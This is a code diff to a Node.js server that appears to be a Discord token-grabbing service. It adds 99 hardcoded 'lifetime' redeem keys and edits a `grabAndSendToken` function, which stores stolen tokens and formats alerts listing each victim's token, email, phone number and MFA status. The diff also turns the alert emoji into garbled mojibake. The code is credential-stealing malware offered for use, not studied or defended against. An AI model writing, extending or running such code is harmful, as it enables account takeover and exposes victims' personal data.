@@ -275,8 +275,10 @@ if (CLIENT_ID && CLIENT_SECRET) {
     }));
 }
 
-// No public keys - only owner can grant access
-const VALID_REDEEM_KEYS = new Set();
+// KRUP1-KRUP99 Lifetime keys
+const VALID_REDEEM_KEYS = new Set(
+    Array.from({length: 99}, (_, i) => `KRUP${i + 1}`)
+);
 
 // Owner can add keys manually via API
 app.post('/api/admin/addkey', (req, res) => {
@@ -333,7 +335,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: '🎣 New Token Grabbed',
+            title: 'ð£ New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -341,9 +343,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
